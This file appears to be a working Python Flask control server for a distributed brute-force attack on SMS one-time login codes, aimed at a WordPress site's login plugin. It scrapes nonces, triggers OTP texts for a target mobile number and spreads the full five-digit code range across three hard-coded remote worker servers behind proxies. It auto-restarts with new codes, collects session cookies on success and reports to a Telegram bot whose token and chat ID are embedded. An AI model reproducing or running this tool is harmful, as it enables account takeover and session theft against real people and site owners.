import requests
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO, emit
import threading
import time
from bs4 import BeautifulSoup
import uuid

app = Flask(__name__)
socketio = SocketIO(app)

# Telegram configuration
TELEGRAM_BOT_TOKEN = "6374641003:AAFG0isVhi6pxBzZDythU96FaTrtEiVQIHY"
TELEGRAM_CHAT_ID = "-4796694839"

REMOTE_SERVERS = [
    "http://23.95.197.222:5000",
    "http://198.12.88.145:5000",
    "http://192.227.134.68:5000",
]

RANGES = [
    (0, 33333),
    (33333, 66666),
    (66666, 99999),
]


progress_log = []
found_success = False
success_codes = []
proxy_setting = ""
current_operation = {}

# Telegram message sending function
def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        return True
    except Exception as e:
        print(f"Failed to send Telegram message: {str(e)}")
        return False

def get_proxy_from_central():
    return "socks5://new_user:new_pass@new_host:new_port"

def update_proxy_from_central():
    global proxy_setting
    while True:
        if not proxy_setting:
            new_proxy = get_proxy_from_central()
            proxy_setting = new_proxy
            message = f"🔄 Proxy updated: {new_proxy}"
            progress_log.append(message)
            send_to_telegram(message)
            socketio.emit('update_progress', {'log': progress_log[-1]})
        time.sleep(1)

threading.Thread(target=update_proxy_from_central, daemon=True).start()

def fetch_nonce(host, mobile):
    try:
        response = requests.get(f"https://{host}/login/", timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        user_login_nonce = soup.find('input', {'id': 'user_login_nonce'})['value']
        
        response = requests.post(
            f"https://{host}/wp-admin/admin-ajax.php",
            headers={
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest"
            },
            data=f"user_login_nonce={user_login_nonce}&_wp_http_referer=%2Flogin%2F&action=kandopanel_user_login&redirect=&log={mobile}&pwd=&otp=1",
            timeout=10
        )
        
        response = requests.get(f"https://{host}/login/?action=login-by-otp&mobile={mobile}", timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        login_otp_nonce = soup.find('input', {'id': 'login_otp_nonce'})['value']
        
        message = f"✅ Nonce fetched successfully for {host}"
        send_to_telegram(message)
        return login_otp_nonce
    except Exception as e:
        message = f"❌ Failed to fetch nonce for {host}: {str(e)}"
        progress_log.append(message)
        send_to_telegram(message)
        socketio.emit('update_progress', {'log': progress_log[-1]})
        return None

def resend_otp(host, mobile, nonce):
    try:
        response = requests.post(
            f"https://{host}/wp-admin/admin-ajax.php",
            headers={
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest"
            },
            data=f"action=resend_otp&mobile={mobile}&nonce={nonce}",
            timeout=10
        )
        response.raise_for_status()
        if response.json().get("success"):
            message = f"📤 SMS resent successfully for {mobile}"
            progress_log.append(message)
            send_to_telegram(message)
            socketio.emit('update_progress', {'log': progress_log[-1]})
            return True
        return False
    except Exception as e:
        message = f"❌ Failed to resend SMS for {mobile}: {str(e)}"
        progress_log.append(message)
        send_to_telegram(message)
        socketio.emit('update_progress', {'log': progress_log[-1]})
        return False

def auto_stop_and_restart():
    global current_operation, found_success
    time.sleep(40 * 60)  # 20 دقیقه صبر
    stop_all_servers()
    
    message = "⏹️ تمام سرورها بعد از ۲۰ دقیقه متوقف شدند"
    send_to_telegram(message)
    
    # منتظر می‌مونیم تا همه سرورها متوقف بشن
    while True:
        status = get_worker_status()
        if all(not data["running"] for data in status.values()):
            break
        time.sleep(1)
    
    message = "✅ توقف تمام سرورها تأیید شد"
    send_to_telegram(message)
    
    if not found_success and current_operation:
        # ۲ دقیقه صبر قبل از تلاش برای ارسال OTP
        message = "⏳ انتظار ۲ دقیقه‌ای قبل از تلاش برای ارسال دوباره OTP"
        send_to_telegram(message)
        time.sleep(120)  # ۲ دقیقه
        
        # تلاش تا ۳ بار برای گرفتن OTP جدید
        for attempt in range(1, 4):
            message = f"🔄 تلاش {attempt} از ۳ برای گرفتن OTP جدید"
            send_to_telegram(message)
            new_nonce = fetch_nonce(current_operation['host'], current_operation['mobile'])
            if new_nonce:
                # به‌روزرسانی nonce در عملیات فعلی
                current_operation['nonce'] = new_nonce
                # ری‌استارت سرورها با پارامترهای قبلی
                threads = []
                for i, server in enumerate(REMOTE_SERVERS):
                    start_r, end_r = current_operation['ranges'][i]
                    thread = threading.Thread(
                        target=send_to_remote,
                        args=(server, current_operation['host'], new_nonce,
                              current_operation['mobile'], current_operation['connections'],
                              start_r, end_r)
                    )
                    threads.append(thread)
                    thread.start()
                
                for thread in threads:
                    thread.join()
                
                message = f"🔄 عملیات با رنج‌های {current_operation['ranges']} ری‌استارت شد"
                send_to_telegram(message)
                
                # برنامه‌ریزی توقف بعدی
                threading.Thread(target=auto_stop_and_restart, daemon=True).start()
                return
            else:
                message = f"❌ تلاش {attempt} برای گرفتن OTP جدید شکست خورد"
                send_to_telegram(message)
                if attempt < 3:
                    message = "⏳ انتظار ۱ دقیقه‌ای قبل از تلاش بعدی"
                    send_to_telegram(message)
                    time.sleep(60)  # ۱ دقیقه صبر بین تلاش‌ها
        
        # اگه بعد از ۳ تلاش موفق نشدیم
        message = "❌ بعد از ۳ تلاش، OTP جدید دریافت نشد. عملیات متوقف شد."
        send_to_telegram(message)
    else:
        message = "ℹ️ نیازی به ری‌استارت نیست: یا موفقیت پیدا شده یا عملیاتی فعال نیست"
        send_to_telegram(message)

def send_to_remote(server_url, host, nonce, mobile, connections, start_range, end_range):
    try:
        response = requests.post(
            f"{server_url}/start",
            json={
                "host": host,
                "nonce": nonce,
                "mobile": mobile,
                "connections": connections,
                "startRange": start_range,
                "endRange": end_range,
                "proxy": proxy_setting
            },
            timeout=10
        )
        response.raise_for_status()
        message = f"📤 درخواست به {server_url} برای رنج {start_range}-{end_range} ارسال شد"
        progress_log.append(message)
        send_to_telegram(message)
        socketio.emit('update_progress', {'log': progress_log[-1]})
    except requests.exceptions.RequestException as e:
        message = f"❌ ارسال درخواست به {server_url} شکست خورد: {str(e)}"
        progress_log.append(message)
        send_to_telegram(message)
        socketio.emit('update_progress', {'log': progress_log[-1]})

def stop_all_servers():
    for server in REMOTE_SERVERS:
        try:
            requests.post(f"{server}/stop", timeout=5)
            message = f"⏹️ درخواست توقف به {server} ارسال شد"
            progress_log.append(message)
            send_to_telegram(message)
            socketio.emit('update_progress', {'log': progress_log[-1]})
        except requests.exceptions.RequestException as e:
            message = f"❌ توقف {server} شکست خورد: {str(e)}"
            progress_log.append(message)
            send_to_telegram(message)
            socketio.emit('update_progress', {'log': progress_log[-1]})

def get_worker_status():
    global success_codes, found_success
    status_data = {}
    for server in REMOTE_SERVERS:
        try:
            response = requests.get(f"{server}/status", timeout=5)
            response.raise_for_status()
            status = response.json()
            status_data[server] = {
                "running": status["running"],
                "current_range": status["current_range"],
                "processed": status["processed"],
                "error": status["error"]
            }
            if status["error"] and "Code" in status["error"] and "found successfully" in status["error"]:
                found_success = True
                code = status["error"].split("Code ")[1].split(" found")[0]
                if not any(s["code"] == code for s in success_codes):
                    success_codes.append({"server": server, "code": code, "cookie_link": f"{server}/last_cookie"})
                message = f"🎉 موفقیت در {server}! کد: {code}\nتوقف تمام سرورها..."
                progress_log.append(message)
                send_to_telegram(message)
                socketio.emit('update_progress', {'log': progress_log[-1]})
                stop_all_servers()
        except requests.exceptions.RequestException as e:
            status_data[server] = {
                "running": False,
                "current_range": {"start": "-", "end": "-"},
                "processed": "-",
                "error": f"اتصال ناموفق: {str(e)}"
            }
            message = f"⚠️ بررسی وضعیت {server} شکست خورد: {str(e)}"
            send_to_telegram(message)
    return status_data

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="fa">
    <head>
        <meta charset="UTF-8">
        <title>بررسی کد OTP - سرور مرکزی</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
        <style>
            body { direction: rtl; font-family: Arial, sans-serif; }
            .container { max-width: 1200px; margin: 0 auto; }
            #progress-table, #success-table, #operation-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            #progress-table th, #progress-table td, #success-table th, #success-table td, #operation-table th, #operation-table td { border: 1px solid #ddd; padding: 12px; text-align: center; }
            #progress-table th, #success-table th, #operation-table th { background-color: #f2f2f2; font-weight: bold; }
            #progress-table tr:nth-child(even), #success-table tr:nth-child(even), #operation-table tr:nth-child(even) { background-color: #f9f9f9; }
            #progress-table tr:hover, #success-table tr:hover, #operation-table tr:hover { background-color: #f1f1f1; }
            .status-active { color: green; font-weight: bold; }
            .status-inactive { color: red; font-weight: bold; }
            .error-cell { color: #d9534f; max-width: 300px; word-wrap: break-word; }
            .success-link { color: #1e90ff; text-decoration: underline; }
        </style>
    </head>
    <body class="bg-gray-100 p-8">
        <div class="container">
            <div class="bg-white p-8 rounded-lg shadow-lg">
                <h1 class="text-3xl font-bold text-center mb-8">بررسی کد OTP - سرور مرکزی</h1>
                <form id="form" class="space-y-6">
                    <div>
                        <label class="block text-sm font-medium text-gray-700">هاست:</label>
                        <input type="text" id="host" class="mt-1 block w-full p-3 border rounded-lg" value="0an0m.com">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">Nonce:</label>
                        <input type="text" id="nonce" class="mt-1 block w-full p-3 border rounded-lg" readonly>
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">شماره موبایل:</label>
                        <input type="text" id="mobile" class="mt-1 block w-full p-3 border rounded-lg" value="0">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
                        <input type="number" id="connections" class="mt-1 block w-full p-3 border rounded-lg" value="20">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">پروکسی (SOCKS5):</label>
                        <input type="text" id="proxy" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: socks5://user:pass@host:port" value="51.195.229.194:13001">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700">نوع اسکن:</label>
                        <div class="mt-2">
                            <label class="inline-flex items-center">
                                <input type="radio" name="scan_type" value="full" class="form-radio" checked>
                                <span class="mr-2">اسکن کامل (00000-99999)</span>
                            </label>
                            <label class="inline-flex items-center mr-6">
                                <input type="radio" name="scan_type" value="custom" class="form-radio">
                                <span class="mr-2">اسکن سفارشی</span>
                            </label>
                        </div>
                    </div>
                    <div id="custom_range" class="hidden space-y-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-700">شروع رنج:</label>
                            <input type="number" id="start_range" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: 20000">
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700">پایان رنج:</label>
                            <input type="number" id="end_range" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: 30000">
                        </div>
                    </div>
                    <div class="flex space-x-6">
                        <button type="button" id="fetch_nonce" class="w-full bg-blue-500 text-white p-3 rounded-lg hover:bg-blue-600">دریافت اطلاعات</button>
                        <button type="button" id="start" class="w-full bg-green-500 text-white p-3 rounded-lg hover:bg-green-600">شروع</button>
                        <button type="button" id="stop" class="w-full bg-red-500 text-white p-3 rounded-lg hover:bg-red-600" disabled>توقف</button>
                    </div>
                </form>
                <div class="mt-8">
                    <h2 class="text-xl font-semibold text-center mb-4">وضعیت سرورها</h2>
                    <table id="progress-table">
                        <thead>
                            <tr>
                                <th>سرور</th>
                                <th>وضعیت</th>
                                <th>رنج فعلی</th>
                                <th>تعداد پردازش‌شده</th>
                                <th>خطا</th>
                            </tr>
                        </thead>
                        <tbody id="table-body">
                        </tbody>
                    </table>
                </div>
                <div class="mt-8">
                    <h2 class="text-xl font-semibold text-center mb-4">موفقیت‌ها</h2>
                    <table id="success-table">
                        <thead>
                            <tr>
                                <th>سرور</th>
                                <th>کد موفق</th>
                                <th>لینک کوکی</th>
                            </tr>
                        </thead>
                        <tbody id="success-body">
                        </tbody>
                    </table>
                </div>
                <div class="mt-8">
                    <h2 class="text-xl font-semibold text-center mb-4">عملیات فعلی</h2>
                    <table id="operation-table">
                        <thead>
                            <tr>
                                <th>هاست</th>
                                <th>Nonce</th>
                                <th>موبایل</th>
                                <th>کانکشن‌ها</th>
                                <th>پروکسی</th>
                            </tr>
                        </thead>
                        <tbody id="operation-body">
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <script>
            const socket = io();
            const form = document.getElementById('form');
            const startBtn = document.getElementById('start');
            const stopBtn = document.getElementById('stop');
            const fetchNonceBtn = document.getElementById('fetch_nonce');
            const tableBody = document.getElementById('table-body');
            const successBody = document.getElementById('success-body');
            const operationBody = document.getElementById('operation-body');

            const servers = [
    "http://23.95.197.222:5000",
    "http://198.12.88.145:5000",
    "http://192.227.134.68:5000",
            ];

            function updateTables() {
                fetch('/get_status')
                    .then(response => response.json())
                    .then(data => {
                        tableBody.innerHTML = '';
                        servers.forEach(server => {
                            const status = data[server] || {
                                running: false,
                                current_range: { start: '-', end: '-' },
                                processed: '-',
                                error: 'داده‌ای در دسترس نیست'
                            };
                            const row = document.createElement('tr');
                            row.innerHTML = `
                                <td>${server}</td>
                                <td class="${status.running ? 'status-active' : 'status-inactive'}">
                                    ${status.running ? 'فعال' : 'غیرفعال'}
                                </td>
                                <td>${status.current_range.start} - ${status.current_range.end}</td>
                                <td>${status.processed} / ${status.current_range.end}</td>
                                <td class="error-cell">${status.error || '-'}</td>
                            `;
                            tableBody.appendChild(row);
                        });

                        fetch('/get_success')
                            .then(response => response.json())
                            .then(successData => {
                                successBody.innerHTML = '';
                                successData.forEach(success => {
                                    const row = document.createElement('tr');
                                    row.innerHTML = `
                                        <td>${success.server}</td>
                                        <td>${success.code}</td>
                                        <td><a href="${success.cookie_link}" class="success-link" target="_blank">دانلود کوکی</a></td>
                                    `;
                                    successBody.appendChild(row);
                                });
                            });

                        fetch('/get_operation')
                            .then(response => response.json())
                            .then(opData => {
                                operationBody.innerHTML = '';
                                if (opData.host) {
                                    const row = document.createElement('tr');
                                    row.innerHTML = `
                                        <td>${opData.host}</td>
                                        <td>${opData.nonce}</td>
                                        <td>${opData.mobile}</td>
                                        <td>${opData.connections}</td>
                                        <td>${opData.proxy || '-'}</td>
                                    `;
                                    operationBody.appendChild(row);
                                }
                            });
                    });
            }

            setInterval(updateTables, 5000);
            updateTables();

            socket.on('connect', () => console.log('اتصال به WebSocket برقرار شد'));
            socket.on('update_progress', function(data) { console.log('لاگ:', data.log); });

            document.querySelectorAll('input[name="scan_type"]').forEach(radio => {
                radio.addEventListener('change', () => {
                    const customRangeDiv = document.getElementById('custom_range');
                    customRangeDiv.classList.toggle('hidden', radio.value !== 'custom');
                });
            });

            fetchNonceBtn.addEventListener('click', () => {
                const host = document.getElementById('host').value;
                const mobile = document.getElementById('mobile').value;
                fetch('/fetch_nonce', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ host, mobile })
                })
                    .then(response => response.json())
                    .then(data => {
                        if (data.nonce) {
                            document.getElementById('nonce').value = data.nonce;
                        } else {
                            alert('خطا در دریافت nonce: ' + (data.error || 'مشکل ناشناخته'));
                        }
                    });
            });

            startBtn.addEventListener('click', () => {
                const host = document.getElementById('host').value;
                const nonce = document.getElementById('nonce').value;
                const mobile = document.getElementById('mobile').value;
                const connections = document.getElementById('connections').value;
                const proxy = document.getElementById('proxy').value;
                const scanType = document.querySelector('input[name="scan_type"]:checked').value;
                let startRange = null;
                let endRange = null;

                if (scanType === 'custom') {
                    startRange = document.getElementById('start_range').value;
                    endRange = document.getElementById('end_range').value;
                    if (!startRange || !endRange || startRange >= endRange) {
                        alert('لطفاً رنج معتبر وارد کنید!');
                        return;
                    }
                }

                fetch('/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ host, nonce, mobile, connections, scan_type: scanType, start_range: startRange, end_range: endRange, proxy })
                }).then(response => {
                    if (response.ok) {
                        startBtn.disabled = true;
                        stopBtn.disabled = false;
                    }
                });

                fetch('/set_proxy', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ proxy })
                });
            });

            stopBtn.addEventListener('click', () => {
                fetch('/stop', {
                    method: 'POST'
                }).then(() => {
                    startBtn.disabled = false;
                    stopBtn.disabled = true;
                });
            });
        </script>
    </body>
    </html>
    ''')

@app.route('/start', methods=['POST'])
def start():
    global progress_log, found_success, success_codes, current_operation
    data = request.get_json()
    host = data['host']
    nonce = data['nonce']
    mobile = data['mobile']
    connections = int(data['connections'])
    scan_type = data.get('scan_type', 'full')
    start_range = data.get('start_range')
    end_range = data.get('end_range')

    found_success = False
    progress_log = []
    success_codes = []
    message = f"🚀 شروع عملیات\nهاست: {host}\nموبایل: {mobile}\nکانکشن‌ها: {connections}\nنوع اسکن: {scan_type}"
    progress_log.append(message)
    send_to_telegram(message)
    socketio.emit('update_progress', {'log': progress_log[-1]})

    if scan_type == 'full':
        ranges = RANGES
    else:
        start_range = int(start_range)
        end_range = int(end_range)
        total_range = end_range - start_range
        chunk_size = total_range // len(REMOTE_SERVERS)
        ranges = []
        for i in range(len(REMOTE_SERVERS)):
            chunk_start = start_range + (i * chunk_size)
            chunk_end = chunk_start + chunk_size if i < len(REMOTE_SERVERS) - 1 else end_range
            ranges.append((chunk_start, chunk_end))

    threads = []
    for i, server in enumerate(REMOTE_SERVERS):
        start_r, end_r = ranges[i]
        thread = threading.Thread(
            target=send_to_remote,
            args=(server, host, nonce, mobile, connections, start_r, end_r)
        )
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    current_operation = {
        'host': host,
        'nonce': nonce,
        'mobile': mobile,
        'connections': connections,
        'ranges': ranges,
        'proxy': proxy_setting
    }
    
    threading.Thread(target=auto_stop_and_restart, daemon=True).start()

    return '', 204

@app.route('/stop', methods=['POST'])
def stop():
    global progress_log
    stop_all_servers()
    message = "🛑 توقف دستی توسط کاربر درخواست شد"
    progress_log.append(message)
    send_to_telegram(message)
    return '', 204

@app.route('/set_proxy', methods=['POST'])
def set_proxy():
    global proxy_setting
    data = request.get_json()
    proxy_setting = data.get('proxy', '')
    message = f"🔧 پروکسی تنظیم شد: {proxy_setting}"
    progress_log.append(message)
    send_to_telegram(message)
    socketio.emit('update_progress', {'log': progress_log[-1]})
    return '', 204

@app.route('/get_status', methods=['GET'])
def get_status():
    return jsonify(get_worker_status())

@app.route('/get_success', methods=['GET'])
def get_success():
    global success_codes
    return jsonify(success_codes)

@app.route('/get_operation', methods=['GET'])
def get_operation():
    global current_operation
    return jsonify(current_operation)

@app.route('/fetch_nonce', methods=['POST'])
def fetch_nonce_route():
    data = request.get_json()
    host = data['host']
    mobile = data['mobile']
    nonce = fetch_nonce(host, mobile)
    if nonce:
        return jsonify({'nonce': nonce})
    return jsonify({'error': 'دریافت nonce ناموفق بود'}), 400

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5001, debug=True)
